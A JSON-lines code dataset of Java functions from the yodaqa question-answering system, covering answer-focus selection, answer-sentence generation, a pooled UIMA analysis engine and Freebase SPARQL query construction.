{"docstring": "/* We do a pretty naive thing - selecting the first noun or\n * the last adverb / adjective / number. */\n", "func_signal": "protected FocusPair fpByPos(JCas jcas)", "code": "{\n\tToken focusTok = null;\n\tAnnotation focus = null;\n\n\tfor (Token t : JCasUtil.select(jcas, Token.class)) {\n\t\tif (t.getPos() == null) {\n\t\t\t/* This in theory should never happen.\n\t\t\t * However, in unsanitized DBpedia inputs,\n\t\t\t * evil characters (like |) that mess up\n\t\t\t * postagging might happen, so this dirty\n\t\t\t * hack guards against that. */\n\t\t\tcontinue;\n\t\t}\n\t\tif (t.getPos().getPosValue().matches(\"^NN.*\")) {\n\t\t\tfocusTok = t;\n\t\t\tfocus = focusTok;\n\t\t\tbreak;\n\t\t} else if (t.getPos().getPosValue().matches(\"^RB.*\")) {\n\t\t\tfocusTok = t;\n\t\t} else if (t.getPos().getPosValue().matches(\"^JJ.*\")) {\n\t\t\tfocusTok = t;\n\t\t} else if (t.getPos().getPosValue().matches(\"^CD.*\")) {\n\t\t\tfocusTok = t;\n\t\t}\n\t\tfocus = focusTok;\n\t}\n\n\tif (focusTok != null)\n\t\treturn new FocusPair(focusTok, focus);\n\telse\n\t\treturn null;\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\analysis\\answer\\FocusGenerator.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/** Autogenerate a full sentence describing the answer.\n * This is designed mainly for answers coming from databases,\n * though a baseline version for fulltext answers shouldn't be\n * that difficult either. */\n", "func_signal": "public synchronized String getAnswerSentence()", "code": "{\n\ttry {\n\t\t// top answer\n\t\tQuestionAnswer a0 = this.answers.get(0);\n\n\t\t// pick the bottom snippet (to skip awards; XXX,\n\t\t// sort them by something tangible), but\n\t\t// preferring a witness-carrying snippet\n\t\tList<Integer> revSIDs = Lists.reverse(a0.getSnippetIDs());\n\t\tAnsweringSnippet s0 = this.snippets.get(revSIDs.get(0));\n\t\tfor (Integer wsid : revSIDs) {\n\t\t\tAnsweringSnippet sw = this.snippets.get(wsid);\n\t\t\tif (sw instanceof AnsweringProperty\n\t\t\t    && ((AnsweringProperty) sw).getWitnessLabel() != null) {\n\t\t\t\ts0 = sw;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tAnswerSource src0 = this.sources.get(s0.getSourceID());\n\n\t\tif (s0 instanceof AnsweringProperty) {\n\t\t\tAnsweringProperty ap0 = (AnsweringProperty) s0;\n\t\t\tboolean showIsBeforeProperty = ap0.getPropertyLabel().toLowerCase().endsWith(\" by\");\n\n\t\t\tStringBuilder sb = new StringBuilder();\n\t\t\tsb.append(src0.getTitle());\n\t\t\tsb.append(\" \");\n\t\t\tif (showIsBeforeProperty)\n\t\t\t\tsb.append(\"is \");\n\t\t\tsb.append(ap0.getPropertyLabel().replaceAll(\".*: \", \"\").toLowerCase());\n\t\t\tsb.append(\" \");\n\t\t\tif (ap0.getWitnessLabel() != null) {\n\t\t\t\tsb.append(\"(for \");\n\t\t\t\tsb.append(ap0.getWitnessLabel());\n\t\t\t\tsb.append(\") \");\n\t\t\t}\n\t\t\tif (!showIsBeforeProperty)\n\t\t\t\tsb.append(\"is \");\n\t\t\tsb.append(a0.getText());\n\t\t\tsb.append(\".\");\n\t\t\treturn sb.toString();\n\t\t} else {\n\t\t\t// TODO\n\t\t\treturn null;\n\t\t}\n\n\t} catch (IndexOutOfBoundsException e) {\n\t\treturn null;\n\t}\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\flow\\dashboard\\Question.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/** Query for a given title, returning a set of PropertyValue instances.\n * The paths set are extra properties to specifically query for:\n * they bypass the blacklist and can traverse multiple nodes. */\n", "func_signal": "public List<PropertyValue> query(String title, List<PathScore> paths, List<Concept> concepts, List<String> witnessLabels, Logger logger)", "code": "{\n\tfor (String titleForm : cookedTitles(title)) {\n\t\tSet<String> topics = queryTopicByTitleForm(titleForm, logger);\n\t\tList<PropertyValue> results = new ArrayList<PropertyValue>();\n\t\tfor (String mid : topics) {\n\t\t\tresults.addAll(queryTopicGeneric(titleForm, mid, logger));\n\t\t\tif (!paths.isEmpty())\n\t\t\t\tresults.addAll(queryTopicSpecific(titleForm, mid, paths, concepts, witnessLabels, logger));\n\t\t}\n\t\tif (!results.isEmpty())\n\t\t\treturn results;\n\t}\n\treturn new ArrayList<PropertyValue>();\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\provider\\rdf\\FreebaseOntology.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/* (non-Javadoc)\n * @see org.apache.uima.analysis_engine.impl.AnalysisEngineImplBase#process(org.apache.uima.jcas.JCas, org.apache.uima.analysis_engine.ResultSpecification, org.apache.uima.util.ProcessTrace)\n */\n", "func_signal": "@Override\npublic void process(JCas aJCas, ResultSpecification aResultSpec, ProcessTrace aTrace)\n    throws ResultNotSupportedException, AnalysisEngineProcessException", "code": "{\n  AnalysisEngine ae = null;\n  try {\n    ae = getAeFromPool();       \n    ae.process(aJCas, aResultSpec, aTrace);\n  } finally {\n    if (ae != null) {\n      mPool.releaseAnalysisEngine(ae);\n    }\n  }\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\flow\\asb\\MultiprocessingAnalysisEngine_MultiplierOk.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/**\n * @see org.apache.uima.analysis_engine.AnalysisEngine#setLogger(org.apache.uima.util.Logger)\n */\n", "func_signal": "public void setLogger(Logger aLogger)", "code": "{\n  super.setLogger(aLogger);\n  mPool.setLogger(aLogger);\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\flow\\asb\\MultiprocessingAnalysisEngine_MultiplierOk.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/** Query for a given MID, returning a set of PropertyValue instances\n * that cover all non-spammy, direct RDF properties.\n *\n * This has relatively low recall, not just due to the limited set\n * of results and blacklist, but also because there are some\n * intermediate nodes (\"virtual topics\") for many properties.\n * E.g. some physical quantities have separate topics and\n * no labels, like ns:chemistry.chemical_element.atomic_mass.\n * Other important examples include ns:people.person.sibling_s,\n * ns:film.person_or_entity_appearing_in_film.films,\n * ns:people.person.education or awards:\n * ns:base.nobelprizes.nobel_subject_area.nobel_awards,\n * ns:award.award_winner.awards_won.\n * For these, we apply a fbpath label prediction machine learning\n * model and handle them in queryTopicSpecific(). */\n", "func_signal": "protected List<PropertyValue> queryTopicGeneric(String titleForm, String mid, Logger logger)", "code": "{\n\tString rawQueryStr =\n\t\t/* Grab all properties of the topic, for starters. */\n\t\t\"ns:\" + mid + \" ?prop ?val .\\n\" +\n\t\t\"BIND(ns:\" + mid + \" AS ?res)\\n\" +\n\t\t/* Check if property is a labelled type, and use that\n\t\t * label as property name if so. */\n\t\t\"OPTIONAL {\\n\" +\n\t\t\"  ?prop ns:type.object.name ?proplabel .\\n\" +\n\t\t\"  FILTER( LANGMATCHES(LANG(?proplabel), \\\"en\\\") )\\n\" +\n\t\t\"} .\\n\" +\n\t\t\"BIND( IF(BOUND(?proplabel), ?proplabel, ?prop) AS ?property )\\n\" +\n\t\t/* Check if value is not a pointer to another topic\n\t\t * we could resolve to a label. */\n\t\t\"OPTIONAL {\\n\" +\n\t\t\"  ?val rdfs:label ?vallabel .\\n\" +\n\t\t\"  FILTER( LANGMATCHES(LANG(?vallabel), \\\"en\\\") )\\n\" +\n\t\t\"}\\n\" +\n\t\t\"BIND( IF(BOUND(?vallabel), ?vallabel, ?val) AS ?value )\\n\" +\n\t\t/* Ignore properties with values that are still URLs,\n\t\t * i.e. pointers to an unlabelled topic. */\n\t\t\"FILTER( !ISURI(?value) )\\n\" +\n\t\t/* Ignore non-English values (this checks even literals,\n\t\t * not target labels like the filter above. */\n\t\t\"FILTER( LANG(?value) = \\\"\\\" || LANGMATCHES(LANG(?value), \\\"en\\\") )\\n\" +\n\t\t/* Keep only ns: properties */\n\t\t\"FILTER( STRSTARTS(STR(?prop), 'http://rdf.freebase.com/ns/') )\\n\" +\n\t\t/* ...but ignore some common junk which yields mostly\n\t\t * no relevant data... */\n\t\t\"FILTER( !STRSTARTS(STR(?prop), 'http://rdf.freebase.com/ns/type') )\\n\" +\n\t\t\"FILTER( !STRSTARTS(STR(?prop), 'http://rdf.freebase.com/ns/common') )\\n\" +\n\t\t\"FILTER( !STRSTARTS(STR(?prop), 'http://rdf.freebase.com/ns/freebase') )\\n\" +\n\t\t\"FILTER( !STRSTARTS(STR(?prop), 'http://rdf.freebase.com/ns/media_common.quotation') )\\n\" +\n\t\t/* ...stuff that's difficult to trust... */\n\t\t\"FILTER( !STRSTARTS(STR(?prop), 'http://rdf.freebase.com/ns/user') )\\n\" +\n\t\t/* ...and some more junk - this one is already a bit\n\t\t * trickier as it might contain relevant data, but\n\t\t * often hidden in relationship objects (like Nobel\n\t\t * prize awards), and also a lot of junk (like the\n\t\t * kwebbase experts - though some might be useful\n\t\t * in a specific context). */\n\t\t\"FILTER( !STRSTARTS(STR(?prop), 'http://rdf.freebase.com/ns/base') )\\n\" +\n\t\t/* topic_server has geolocation (not useful right now)\n\t\t * and population_number (which would be useful, but\n\t\t * needs special handling has a topic may have many\n\t\t * of these, e.g. White House). Also it has crappy\n\t\t * type labels. */\n\t\t\"FILTER( !STRSTARTS(STR(?prop), 'http://rdf.freebase.com/ns/topic_server') )\\n\" +\n\t\t/* Eventually, a specific blacklist of *mostly*\n\t\t * useless data that flood out the useful results. */\n\t\t\"FILTER( !STRSTARTS(STR(?prop), 'http://rdf.freebase.com/ns/\" +\n\t\tStringUtils.join(propBlacklist,\n\t\t\t\"') )\\nFILTER( !STRSTARTS(STR(?prop), 'http://rdf.freebase.com/ns/\") +\n\t\t\t\"') )\\n\" +\n\t\t\"\";\n\t// logger.debug(\"executing sparql query: {}\", rawQueryStr);\n\tList<Literal[]> rawResults = rawQuery(rawQueryStr,\n\t\tnew String[] { \"property\", \"value\", \"prop\", \"/val\", \"/res\" }, PROP_LIMIT);\n\n\tList<PropertyValue> results = new ArrayList<PropertyValue>(rawResults.size());\n\tfor (Literal[] rawResult : rawResults) {\n\t\t/* ns:astronomy.star.temperature_k -> \"temperature\"\n\t\t * ns:astronomy.star.planet_s -> \"planet\"\n\t\t * ns:astronomy.star.spectral_type -> \"spectral type\"\n\t\t * ns:chemistry.chemical_element.periodic_table_block -> \"periodic table block\"\n\t\t *\n\t\t * But typically we fetch the property name from\n\t\t * the RDF store too, so this should be irrelevant\n\t\t * in that case.*/\n\t\tString propLabel = rawResult[0].getString().\n\t\t\treplaceAll(\"^.*\\\\.([^\\\\. ]*)$\", \"\\\\1\").\n\t\t\treplaceAll(\"_.$\", \"\").\n\t\t\treplaceAll(\"_\", \" \");\n\t\tString value = rawResult[1].getString();\n\t\tString prop = rawResult[2].getString();\n\t\tString valRes = rawResult[3] != null ? rawResult[3].getString() : null;\n\t\tString objRes = rawResult[4].getString();\n\t\tlogger.debug(\"Freebase {}/{} property: {}/{} -> {} ({})\", titleForm, mid, propLabel, prop, value, valRes);\n\t\tAnswerFV fv = new AnswerFV();\n\t\tfv.setFeature(AF.OriginFreebaseOntology, 1.0);\n\t\tresults.add(new PropertyValue(titleForm, objRes, propLabel,\n\t\t\t\t\tvalue, valRes, null,\n\t\t\t\t\tfv, AnswerSourceStructured.ORIGIN_ONTOLOGY));\n\t}\n\n\treturn results;\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\provider\\rdf\\FreebaseOntology.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/**\n * @see org.apache.uima.resource.Resource#initialize(org.apache.uima.resource.ResourceSpecifier,\n *      java.util.Map)\n */\n", "func_signal": "public boolean initialize(ResourceSpecifier aSpecifier, Map<String, Object> aAdditionalParams)\n        throws ResourceInitializationException", "code": "{\n  \n  // Read parameters from the aAdditionalParams map.\n  // (First copy it so we can modify it and send the parameters on to\n  // each Analysis Engine in the pool.)\n  if (aAdditionalParams == null) {\n    aAdditionalParams = new HashMap<String, Object>();\n  } else {\n    aAdditionalParams = new HashMap<String, Object>(aAdditionalParams);\n  }\n\n  // get or create ResourceManager\n  // This ResourceManager is shared among all the AEs in the pool, and also used by \n  // this MultiprocessingAE instance\n  // https://issues.apache.org/jira/browse/UIMA-2078\n  ResourceManager resMgr = (ResourceManager) aAdditionalParams.get(Resource.PARAM_RESOURCE_MANAGER);\n  if (resMgr == null) {\n    resMgr = UIMAFramework.newDefaultResourceManager(); \n    aAdditionalParams.put(Resource.PARAM_RESOURCE_MANAGER, resMgr);\n  }\n  \n  // Share the configMgr so that (re)configure actions affect all instances\n  \n  ConfigurationManager configMgr = (ConfigurationManager) aAdditionalParams.get(Resource.PARAM_CONFIG_MANAGER);\n  if (configMgr == null) {\n    configMgr = UIMAFramework.newConfigurationManager();\n    aAdditionalParams.put(Resource.PARAM_CONFIG_MANAGER, configMgr);\n  }\n  \n  super.initialize(aSpecifier, aAdditionalParams);\n\n  // determine size of Analysis Engine pool and timeout period\n  Integer poolSizeInteger = (Integer) aAdditionalParams.get(PARAM_NUM_SIMULTANEOUS_REQUESTS);\n  int poolSize = (poolSizeInteger != null) ? poolSizeInteger.intValue()\n          : DEFAULT_NUM_SIMULTANEOUS_REQUESTS;\n\n  Integer timeoutInteger = (Integer) aAdditionalParams.get(PARAM_TIMEOUT_PERIOD);\n  mTimeout = (timeoutInteger != null) ? timeoutInteger.intValue() : DEFAULT_TIMEOUT_PERIOD;\n\n  // Share resource manager, but don't share uima-context\n//    // add UimaContext to params map so that all AEs in pool will share it\n//    aAdditionalParams.put(PARAM_UIMA_CONTEXT, getUimaContextAdmin());\n\n  \n  // create pool (REMOVE pool size parameter from map so we don't try to\n  // fill pool with other MultiprocessingAnalysisEngines!)\n  aAdditionalParams.remove(PARAM_NUM_SIMULTANEOUS_REQUESTS);\n  mPool = new AnalysisEnginePool(\"\", poolSize, aSpecifier, aAdditionalParams);\n\n  // update metadata from pool (this gets the merged type system for aggregates)\n  this.setMetaData(mPool.getMetaData());\n  return true;\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\flow\\asb\\MultiprocessingAnalysisEngine_MultiplierOk.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/**\n * @see org.apache.uima.analysis_engine.AnalysisEngine#process(org.apache.uima.cas.CAS,\n *      org.apache.uima.analysis_engine.ResultSpecification)\n */\n", "func_signal": "public ProcessTrace process(CAS aCAS, ResultSpecification aResultSpec)\n        throws ResultNotSupportedException, AnalysisEngineProcessException", "code": "{\n  AnalysisEngine ae = null;\n  try {\n    ae = getAeFromPool();\n    return ae.process(aCAS, aResultSpec);\n  } finally {\n    if (ae != null) {\n      mPool.releaseAnalysisEngine(ae);\n    }\n  }\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\flow\\asb\\MultiprocessingAnalysisEngine_MultiplierOk.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/** Query for a given MID, returning a set of PropertyValue instances\n * that cover the specified property paths.  This generalizes poorly\n * to lightly covered topics, but has high precision+recall for some\n * common topics where it can reach through the meta-nodes. */\n", "func_signal": "protected List<PropertyValue> queryTopicSpecific(String titleForm, String mid, List<PathScore> paths, List<Concept> concepts, List<String> witnessLabels, Logger logger)", "code": "{\n\t/* Test query:\n\t   PREFIX ns: <http://rdf.freebase.com/ns/>\n\t   PREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>\n\t   SELECT ?prop ?t0 ?value WHERE {\n\t     {\n\t       ns:m.09l3p ns:film.actor.film ?t0 .\n\t       ?t0 ns:film.performance.character ?val .\n\t       ns:film.actor.film rdfs:label ?p0 .\n\t       ns:film.performance.character rdfs:label ?p1 .\n\t       BIND(CONCAT(?p0, \": \", ?p1) AS ?prop)\n\t     } UNION {\n\t       ns:m.09l3p ns:film.actor.film ?t0 .\n\t       ?t0 ns:film.performance.film ?val .\n\t       ns:film.actor.film rdfs:label ?p0 .\n\t       ns:film.performance.film rdfs:label ?p1 .\n\t       BIND(CONCAT(?p0, \": \", ?p1) AS ?prop)\n\t     } UNION {\n\t       ns:m.09l3p ns:people.person.nationality ?val .\n\t       ns:people.person.nationality rdfs:label ?prop .\n\t     }\n\t     OPTIONAL { ?val rdfs:label ?vallabel . FILTER( LANGMATCHES(LANG(?vallabel), \"en\") ) } \n\t     BIND( IF(BOUND(?vallabel), ?vallabel, ?val) AS ?value )\n\t   }\n\t */\n\tList<String> pathQueries = new ArrayList<>();\n\tfor (PathScore ps : paths) {\n\t\tPropertyPath path = ps.path;\n\t\tassert(path.size() <= 3);  // longer paths don't occur in our dataset\n\t\tlogger.debug(\"specific path {} {}\", path, path.size());\n\t\tif (path.size() == 1) {\n\t\t\tString pathQueryStr = \"{\" +\n\t\t\t\t\"  ns:\" + mid + \" ns:\" + path.get(0) + \" ?val .\\n\" +\n\t\t\t\t\"  BIND(\\\"ns:\" + path.get(0) + \"\\\" AS ?prop)\\n\" +\n\t\t\t\t\"  BIND(\" + ps.proba + \" AS ?score)\\n\" +\n\t\t\t\t\"  BIND(0 AS ?branched)\\n\" +\n\t\t\t\t\"  BIND(ns:\" + mid + \" AS ?res)\\n\" +\n\t\t\t\t\"  OPTIONAL {\\n\" +\n\t\t\t\t\"    ns:\" + path.get(0) + \" rdfs:label ?proplabel .\\n\" +\n\t\t\t\t\"    FILTER(LANGMATCHES(LANG(?proplabel), \\\"en\\\"))\\n\" +\n\t\t\t\t\"  }\\n\" +\n\t\t\t\t\"}\";\n\t\t\tpathQueries.add(pathQueryStr);\n\t\t} else if (path.size() == 2) {\n\t\t\tString pathQueryStr = \"{\" +\n\t\t\t\t\"  ns:\" + mid + \" ns:\" + path.get(0) + \"/ns:\" + path.get(1) + \" ?val .\\n\" +\n\t\t\t\t\"  BIND(\\\"ns:\" + path.get(0) + \"/ns:\" + path.get(1) + \"\\\" AS ?prop)\\n\" +\n\t\t\t\t\"  BIND(\" + ps.proba + \" AS ?score)\\n\" +\n\t\t\t\t\"  BIND(0 AS ?branched)\\n\" +\n\t\t\t\t\"  BIND(ns:\" + mid + \" AS ?res)\\n\" +\n\t\t\t\t\"  OPTIONAL {\\n\" +\n\t\t\t\t\"    ns:\" + path.get(0) + \" rdfs:label ?pl0 .\\n\" +\n\t\t\t\t\"    ns:\" + path.get(1) + \" rdfs:label ?pl1 .\\n\" +\n\t\t\t\t\"    FILTER(LANGMATCHES(LANG(?pl0), \\\"en\\\"))\\n\" +\n\t\t\t\t\"    FILTER(LANGMATCHES(LANG(?pl1), \\\"en\\\"))\\n\" +\n\t\t\t\t\"    BIND(CONCAT(?pl0, \\\": \\\", ?pl1) AS ?proplabel)\\n\" +\n\t\t\t\t\"  }\\n\" +\n\t\t\t\t\"}\";\n\t\t\tpathQueries.add(pathQueryStr);\n\t\t} else if (path.size() == 3) {\n\t\t\tfor (Concept c: concepts) {\n\t\t\t\tpathQueries.add(getWitnessQuery(mid, ps, c.getFullLabel(), c.getPageID()));\n\t\t\t}\n\t\t\tfor (String w: witnessLabels) {\n\t\t\t\tpathQueries.add(getWitnessQuery(mid, ps, w, null));\n\t\t\t}\n\t\t}\n\t}\n\tString rawQueryStr =\n\t\tStringUtils.join(pathQueries, \" UNION \") +\n\t\t\"BIND( IF(BOUND(?proplabel), ?proplabel, ?prop) AS ?property )\\n\" +\n\t\t/* Check if value is not a pointer to another topic\n\t\t * we could resolve to a label. */\n\t\t\"OPTIONAL {\\n\" +\n\t\t\"  ?val rdfs:label ?vallabel .\\n\" +\n\t\t\"  FILTER( LANGMATCHES(LANG(?vallabel), \\\"en\\\") )\\n\" +\n\t\t\"}\\n\" +\n\t\t\"BIND( IF(BOUND(?vallabel), ?vallabel, ?val) AS ?value )\\n\" +\n\t\t/* Ignore properties with values that are still URLs,\n\t\t * i.e. pointers to an unlabelled topic. */\n\t\t\"FILTER( !ISURI(?value) )\\n\" +\n\t\t/* Ignore non-English values (this checks even literals,\n\t\t * not target labels like the filter above. */\n\t\t\"FILTER( LANG(?value) = \\\"\\\" || LANGMATCHES(LANG(?value), \\\"en\\\") )\\n\" +\n\t\t\"\";\n\t// logger.debug(\"executing sparql query: {}\", rawQueryStr);\n\tList<Literal[]> rawResults = rawQuery(rawQueryStr,\n\t\tnew String[] { \"property\", \"value\", \"prop\", \"/val\", \"/res\", \"score\", \"branched\", \"witnessAF\", \"wlabel\" },\n\t\t/* We want to be fairly liberal and look at all the properties\n\t\t * as the interesting ones may be far down in the list,\n\t\t * but there is some super-spammy stuff like all locations\n\t\t * contained in Poland that we just need to avoid. */\n\t\tPROP_LIMIT * 10);\n\n\tList<PropertyValue> results = new ArrayList<PropertyValue>(rawResults.size());\n\tfor (Literal[] rawResult : rawResults) {\n\t\t/* ns:astronomy.star.temperature_k -> \"temperature\"\n\t\t * ns:astronomy.star.planet_s -> \"planet\"\n\t\t * ns:astronomy.star.spectral_type -> \"spectral type\"\n\t\t * ns:chemistry.chemical_element.periodic_table_block -> \"periodic table block\"\n\t\t *\n\t\t * But typically we fetch the property name from\n\t\t * the RDF store too, so this should be irrelevant\n\t\t * in that case.*/\n\t\tString propLabel = rawResult[0].getString().\n\t\t\treplaceAll(\"^.*\\\\.([^\\\\. ]*)$\", \"\\\\1\").\n\t\t\treplaceAll(\"_.$\", \"\").\n\t\t\treplaceAll(\"_\", \" \");\n\t\tString value = rawResult[1].getString();\n\t\tString prop = rawResult[2].getString();\n\t\tString valRes = rawResult[3] != null ? rawResult[3].getString() : null;\n\t\tString objRes = rawResult[4].getString();\n\t\tdouble score = rawResult[5].getDouble();\n\t\tboolean isBranched = rawResult[6].getInt() != 0;\n\t\tString witnessAF = rawResult[7] != null ? rawResult[7].getString() : null;\n\t\tString wLabel = rawResult[8] != null ? rawResult[8].getString() : null;\n\t\tlogger.debug(\"Freebase {}/{} property: {}/{} -> {} ({}) {} {},{},<<{}>>\",\n\t\t\ttitleForm, mid, propLabel, prop, value, valRes, score,\n\t\t\tisBranched ? \"branched\" : \"straight\", witnessAF,\n\t\t\twLabel);\n\t\tAnswerFV fv = new AnswerFV();\n\t\tfv.setFeature(AF.OriginFreebaseSpecific, 1.0);\n\t\tif (isBranched)\n\t\t\tfv.setFeature(AF.OriginFreebaseBranched, 1.0);\n\t\tif (witnessAF != null)\n\t\t\tfv.setFeature(witnessAF, 1.0);\n\t\tPropertyValue pv = new PropertyValue(titleForm, objRes, propLabel,\n\t\t\t\tvalue, valRes, wLabel,\n\t\t\t\tfv, AnswerSourceStructured.ORIGIN_SPECIFIC);\n\t\tpv.setPropRes(prop);\n\t\tpv.setScore(score);\n\t\tresults.add(pv);\n\t}\n\n\treturn results;\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\provider\\rdf\\FreebaseOntology.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/* (non-Javadoc)\n * @see org.apache.uima.analysis_engine.impl.AnalysisEngineImplBase#processAndOutputNewCASes(org.apache.uima.jcas.JCas)\n */\n", "func_signal": "@Override\npublic JCasIterator processAndOutputNewCASes(JCas aJCas) throws AnalysisEngineProcessException", "code": "{\n  enterProcess(); // start timer for collecting performance stats\n  AnalysisEngine ae = null;\n  try {\n    // System.err.println(\"+ pAONC \" + aJCas);\n    ae = getAeFromPool();\n    // System.err.println(\"> pAONC \" + aJCas + \" \" + ae);\n    return new PooledJCasIterator(ae.processAndOutputNewCASes(aJCas), ae);\n  } catch (AnalysisEngineProcessException e) {\n    // System.err.println(\"! pAONC \" + aCAS + \" \" + ae);\n    if (ae != null) {\n      mPool.releaseAnalysisEngine(ae);\n    }\n    throw e;\n  } finally {\n    exitProcess(); // stop timer for collecting performance stats\n  }\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\flow\\asb\\MultiprocessingAnalysisEngine_MultiplierOk.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/** Query for a given specific title form, returning a set of\n * topic MIDs. */\n", "func_signal": "public Set<String> queryTopicByTitleForm(String title, Logger logger)", "code": "{\n\t/* XXX: Case-insensitive search via SPARQL turns out\n\t * to be surprisingly tricky.  Cover 91% of all cases\n\t * by capitalizing words that are not stopwords  */\n\ttitle = super.capitalizeTitle(title);\n\n\tString quotedTitle = title.replaceAll(\"\\\"\", \"\").replaceAll(\"\\\\\\\\\", \"\").replaceAll(\"\\n\", \" \");\n\t/* If you want to paste this to SPARQL query interface,\n\t * just pass the block below through\n\t * \techo 'PREFIX ns: <http://rdf.freebase.com/ns/>'; echo 'PREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>'; echo 'SELECT ?topic WHERE {'; perl -pe 'undef $_ unless /\"/; s/\\s*\"//; s/\\\\n\" \\+$//;'; echo '}'\n\t */\n\tString rawQueryStr =\n\t\t\"?topic rdfs:label \\\"\" + quotedTitle + \"\\\"@en.\\n\" +\n\t\t/* Keep only topics that are associated with\n\t\t * an enwiki concept.  The rest is junk. */\n\t\t\"?topic ns:type.object.key ?key .\\n\" +\n\t\t\"FILTER( REGEX(STR(?key), '^/wikipedia/en/') )\" +\n\t\t\"\";\n\t// logger.debug(\"executing sparql query: {}\", rawQueryStr);\n\tList<Literal[]> rawResults = rawQuery(rawQueryStr,\n\t\tnew String[] { \"topic\", \"key\" }, TOPIC_LIMIT);\n\n\tSet<String> results = new HashSet<String>(rawResults.size());\n\tfor (Literal[] rawResult : rawResults) {\n\t\tString mid = rawResult[0].getString();\n\t\tString key = rawResult[1].getString();\n\t\tlogger.debug(\"Freebase {} topic MID {} ({})\", title, mid, key);\n\t\tresults.add(mid);\n\t}\n\n\treturn results;\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\provider\\rdf\\FreebaseOntology.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/** Return a SPARQL select fragment for matching 3-relation path with\n * a given witness (connected extra selector clue). */\n", "func_signal": "protected String getWitnessQuery(String mid, PathScore ps, String fullLabel, Integer pageID)", "code": "{\n\tPropertyPath path = ps.path;\n\tString witnessRel = path.get(2);\n\tString quotedTitle = fullLabel.replaceAll(\"\\\"\", \"\").replaceAll(\"\\\\\\\\\", \"\").replaceAll(\"\\n\", \" \");\n\tString pathQueryStr = \"{\" +\n\t\t\"  ns:\" + mid + \" ns:\" + path.get(0) + \" ?med .\\n\" +\n\t\t\"  ?med ns:\" + path.get(1) + \" ?val .\\n\";\n\n\tif (pageID != null) {\n\t\t/* MID witness match */\n\t\tpathQueryStr +=\n\t\t\t\"  {\\n\" +\n\t\t\t\"    ?med ns:\" + witnessRel + \" ?concept .\\n\" +\n\t\t\t\"    ?concept <http://rdf.freebase.com/key/wikipedia.en_id> \\\"\" + pageID + \"\\\" .\\n\" +\n\t\t\t\"    ?concept rdfs:label ?wlabel .\\n\" +\n\t\t\t\"    FILTER(LANGMATCHES(LANG(?wlabel), \\\"en\\\"))\\n\" +\n\t\t\t\"    BIND(\\\"\" + AF.OriginFreebaseWitnessMid + \"\\\" AS ?witnessAF)\\n\" +\n\t\t\t\"  } UNION\";\n\t}\n\n\t/* Label witness match */\n\tpathQueryStr +=\n\t\t\" {\\n\" +\n\t\t\"    {\\n\" +\n\t\t\"      ?med ns:\" + witnessRel + \" ?wlabel .\\n\" +\n\t\t\"      FILTER(!ISURI(?wlabel))\\n\" +\n\t\t\"    } UNION {\\n\" +\n\t\t\"      ?med ns:\" + witnessRel + \" ?concept .\\n\" +\n\t\t\"      ?concept rdfs:label ?wlabel .\\n\" +\n\t\t\"    }\\n\" +\n\t\t\"    FILTER(LANGMATCHES(LANG(?wlabel), \\\"en\\\"))\\n\" +\n\t\t\"    FILTER(CONTAINS(LCASE(?wlabel), LCASE(\\\"\" + quotedTitle + \"\\\")))\\n\" +\n\t\t\"    BIND(\\\"\" + AF.OriginFreebaseWitnessLabel + \"\\\" AS ?witnessAF)\\n\" +\n\t\t\"  }\\n\" +\n\n\t\t\"  BIND(\\\"ns:\" + path.get(0) + \"/ns:\" + path.get(1) + \"\\\" AS ?prop)\\n\" +\n\t\t\"  BIND(\" + ps.proba + \" AS ?score)\\n\" +\n\t\t\"  BIND(1 AS ?branched)\\n\" +\n\t\t\"  BIND(ns:\" + mid + \" AS ?res)\\n\" +\n\t\t\"  OPTIONAL {\\n\" +\n\t\t\"    ns:\" + path.get(0) + \" rdfs:label ?pl0 .\\n\" +\n\t\t\"    ns:\" + path.get(1) + \" rdfs:label ?pl1 .\\n\" +\n\t\t\"    FILTER(LANGMATCHES(LANG(?pl0), \\\"en\\\"))\\n\" +\n\t\t\"    FILTER(LANGMATCHES(LANG(?pl1), \\\"en\\\"))\\n\" +\n\t\t\"    BIND(CONCAT(?pl0, \\\": \\\", ?pl1) AS ?proplabel)\\n\" +\n\t\t\"  }\\n\" +\n\t\t\"}\";\n\treturn pathQueryStr;\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\provider\\rdf\\FreebaseOntology.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
